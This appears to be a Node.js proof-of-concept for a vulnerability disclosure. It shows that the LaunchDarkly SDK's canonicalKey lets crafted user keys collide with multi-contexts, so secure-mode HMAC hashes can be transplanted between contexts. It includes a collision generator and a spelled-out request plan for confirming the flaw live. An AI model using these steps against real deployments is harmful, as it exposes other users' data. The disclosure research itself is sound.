#!/usr/bin/env node
/**
 * PoC — LaunchDarkly context canonicalKey is NOT injective (secure-mode hash transplant)
 *
 * Runs the REAL SDK function: node-server-sdk/context.js → getCanonicalKey()
 * (repo name ends in `-sdk`, i.e. in the program's accepted SDK scope) and compares it against
 * a verbatim transcription of js-core's implementation
 * (js-core/packages/shared/common/src/Context.ts, `canonicalKey` getter + `encodeKey`).
 *
 * The asymmetry: `encodeKey()` escapes ':' -> '%3A' and '%' -> '%25', but it is applied ONLY to
 * non-`user` kinds. A single-kind `user` context returns its key RAW. So a user context whose key
 * contains colons produces the same canonicalKey as a multi-context.
 *
 * Why it matters: secure mode = HMAC-SHA256(sdkKey, canonicalKey). If two DIFFERENT contexts share
 * a canonicalKey, a hash legitimately issued for one authorises evaluation of the other, which
 * defeats the documented guarantee that "one end user cannot inspect the variations for another
 * end user" (launchdarkly.com/docs/sdk/features/secure-mode).
 *
 * Usage: node tools/poc-canonicalkey-collision.js [outDir]
 * No network access. No credentials. Pure local computation over public SDK source.
 */
'use strict';

const path = require('path');
const fs = require('fs');

// ---- 1. the real SDK implementation (node-server-sdk, a `-sdk` repo) -------------------------
const sdkDir = path.join(__dirname, '..', 'sdk', 'node-server-sdk');
let realGetCanonicalKey = null;
try {
  // eslint-disable-next-line global-require, import/no-dynamic-require
  ({ getCanonicalKey: realGetCanonicalKey } = require(path.join(sdkDir, 'context.js')));
} catch (e) {
  console.error(`!! could not require ${sdkDir}/context.js (${e.message})`);
  console.error('   clone it first:  git clone --depth 1 https://github.com/launchdarkly/node-server-sdk sdk/node-server-sdk');
  process.exit(2);
}

// ---- 2. verbatim transcription of js-core's logic (shared/common/src/Context.ts) -------------
function encodeKey_jscore(key) {
  if (key.includes('%') || key.includes(':')) {
    return key.replace(/%/g, '%25').replace(/:/g, '%3A');
  }
  return key;
}
// js-core builds a Context object; this reproduces the canonicalKey getter for a plain context
// literal, including its rule that a multi-context's kinds are sorted and joined with ':'.
function canonicalKey_jscore(ctx) {
  if (ctx.kind === 'multi') {
    return Object.keys(ctx)
      .filter((k) => k !== 'kind')
      .sort()
      .map((kind) => `${kind}:${encodeKey_jscore(ctx[kind].key)}`)
      .join(':');
  }
  if (ctx.kind === 'user' || ctx.kind === undefined || ctx.kind === null) {
    return ctx.key; // <-- RAW: no encodeKey
  }
  return `${ctx.kind}:${encodeKey_jscore(ctx.key)}`;
}

const outDir = process.argv[2] || path.join(__dirname, '..', 'findings', 'F-002-canonicalkey-collision');
fs.mkdirSync(outDir, { recursive: true });
const log = [];
const say = (s = '') => { log.push(s); console.log(s); };

say('# canonicalKey collision PoC');
say(`node-server-sdk: ${path.join(sdkDir, 'context.js')}`);
say(`js-core transcription: packages/shared/common/src/Context.ts (encodeKey + canonicalKey getter)`);
say('');

// ---- 3. the headline collision ---------------------------------------------------------------
const A = { kind: 'user', key: 'org:o1:user:u1' };                      // single-kind user
const B = { kind: 'multi', org: { key: 'o1' }, user: { key: 'u1' } };   // multi-context

say('## 1. Headline collision');
say(`A = ${JSON.stringify(A)}`);
say(`B = ${JSON.stringify(B)}`);
say('');
for (const [name, fn] of [['node-server-sdk getCanonicalKey', realGetCanonicalKey],
                          ['js-core canonicalKey (transcribed)', canonicalKey_jscore]]) {
  const ka = fn(A);
  const kb = fn(B);
  say(`${name}:`);
  say(`  canonicalKey(A) = ${JSON.stringify(ka)}`);
  say(`  canonicalKey(B) = ${JSON.stringify(kb)}`);
  say(`  COLLISION: ${ka === kb}`);
  say('');
}

// ---- 4. HMAC consequence (secure mode) -------------------------------------------------------
const crypto = require('crypto');
const secureModeHash = (sdkKey, ctx, fn) =>
  crypto.createHmac('sha256', sdkKey).update(fn(ctx)).digest('hex');
const DEMO_SDK_KEY = 'sdk-00000000-0000-0000-0000-000000000000'; // dummy; no real key needed
say('## 2. Secure-mode consequence (HMAC-SHA256(sdkKey, canonicalKey))');
say(`dummy sdk key: ${DEMO_SDK_KEY}`);
const hA = secureModeHash(DEMO_SDK_KEY, A, realGetCanonicalKey);
const hB = secureModeHash(DEMO_SDK_KEY, B, realGetCanonicalKey);
say(`  h(A) = ${hA}`);
say(`  h(B) = ${hB}`);
say(`  IDENTICAL HASH FOR TWO DIFFERENT CONTEXTS: ${hA === hB}`);
say('  → a hash issued by the customer backend for context A is accepted for context B.');
say('');

// ---- 5. systematic collision search ----------------------------------------------------------
say('## 3. Systematic collision search (kinds/keys that a normal app could produce)');
const kinds = ['user', 'org', 'organization', 'device', 'session', 'tenant', 'team'];
const keys = ['u1', 'o1', 'd1', 's1', 'alice', 'acme', 'user', 'org'];
const singles = [];
for (const kind of kinds) for (const key of keys) singles.push({ kind, key });
// also single-kind user contexts whose key embeds a "kind:key" pair (the collision generator)
const crafted = [];
for (const k1 of kinds) for (const v1 of keys) for (const k2 of kinds) for (const v2 of keys) {
  crafted.push({ kind: 'user', key: `${k1}:${v1}:${k2}:${v2}` });
}
const multis = [];
for (const k1 of kinds) for (const v1 of keys) for (const k2 of kinds) for (const v2 of keys) {
  if (k1 === k2) continue;
  multis.push({ kind: 'multi', [k1]: { key: v1 }, [k2]: { key: v2 } });
}
const all = [...singles, ...crafted, ...multis];
const byCanonical = new Map();
let collisions = 0;
const examples = [];
for (const ctx of all) {
  const ck = realGetCanonicalKey(ctx);
  if (byCanonical.has(ck)) {
    collisions += 1;
    if (examples.length < 12) examples.push([ck, byCanonical.get(ck), ctx]);
  } else {
    byCanonical.set(ck, ctx);
  }
}
say(`  contexts generated: ${all.length} (${singles.length} single, ${crafted.length} crafted-user, ${multis.length} multi)`);
say(`  distinct canonicalKeys: ${byCanonical.size}`);
say(`  COLLIDING pairs found: ${collisions}`);
say('');
say('  first collisions (canonicalKey ← two different contexts):');
for (const [ck, c1, c2] of examples) {
  say(`    ${JSON.stringify(ck)}`);
  say(`      ← ${JSON.stringify(c1)}`);
  say(`      ← ${JSON.stringify(c2)}`);
}
say('');

// ---- 6. do both implementations agree? (cross-SDK consistency) -------------------------------
say('## 4. Cross-implementation agreement');
let disagree = 0;
for (const ctx of all) {
  if (realGetCanonicalKey(ctx) !== canonicalKey_jscore(ctx)) {
    disagree += 1;
    if (disagree <= 5) say(`  DISAGREE on ${JSON.stringify(ctx)}: node=${realGetCanonicalKey(ctx)} js-core=${canonicalKey_jscore(ctx)}`);
  }
}
say(`  disagreements: ${disagree} / ${all.length}`);
say('  (agreement means this is a shared SPEC-level flaw, not one SDK typo: the same collision');
say('   exists in every SDK that follows the canonicalKey spec, and therefore on the server,');
say('   which must compute the same value to verify the `h` parameter.)');
say('');

// ---- 7. the second asymmetry: kind names are not encoded ------------------------------------
say('## 5. Secondary asymmetry — KIND names are never encoded');
const C = { kind: 'a:b:c', key: 'd' };                                  // kind containing colons
const D = { kind: 'multi', a: { key: 'b' }, c: { key: 'd' } };          // multi
say(`C = ${JSON.stringify(C)}`);
say(`D = ${JSON.stringify(D)}`);
say(`  node-server-sdk: canonicalKey(C)=${JSON.stringify(realGetCanonicalKey(C))}  canonicalKey(D)=${JSON.stringify(realGetCanonicalKey(D))}`);
say(`  COLLISION: ${realGetCanonicalKey(C) === realGetCanonicalKey(D)}`);
say('  (exploitable only if the service accepts context kinds containing ":" — context-kind');
say('   naming rules are enforced server-side, so this vector needs live confirmation; the');
say('   user-key vector in §1 needs no unusual kind names at all.)');
say('');

// ---- 8. what a live confirmation looks like (documented, NOT executed here) ------------------
say('## 6. Live confirmation plan (not executed by this script)');
say('  Requires an environment with secure mode ON and a backend that signs a context key the');
say('  attacker can influence (username, tenant slug, device id, session id, etc.):');
say('   1. backend signs A = {kind:"user", key:"org:<victimOrg>:user:<victimUser>"}  → h');
say('   2. attacker calls the client-side eval route with B = {kind:"multi",');
say('      org:{key:"<victimOrg>"}, user:{key:"<victimUser>"}} and h from step 1:');
say('        GET https://app.launchdarkly.com/sdk/evalx/{clientSideId}/contexts/{b64url(B)}?h={h}&withReasons=true');
say('   3. expected (secure): 4xx invalid hash.  observed if vulnerable: 200 + B\'s flag values,');
say('      i.e. the victim multi-context was evaluated using a hash issued for a different context.');
say('  Only our own tenants/environments are used; stop at proof and report.');

fs.writeFileSync(path.join(outDir, 'poc-output.txt'), log.join('\n') + '\n');
fs.writeFileSync(path.join(outDir, 'collision-examples.json'),
  JSON.stringify({ headline: { A, B, canonicalKey: realGetCanonicalKey(A) }, systematic: examples.map(([ck, c1, c2]) => ({ canonicalKey: ck, contexts: [c1, c2] })) }, null, 1));
say('');
say(`written: ${path.join(outDir, 'poc-output.txt')}`);
say(`written: ${path.join(outDir, 'collision-examples.json')}`);
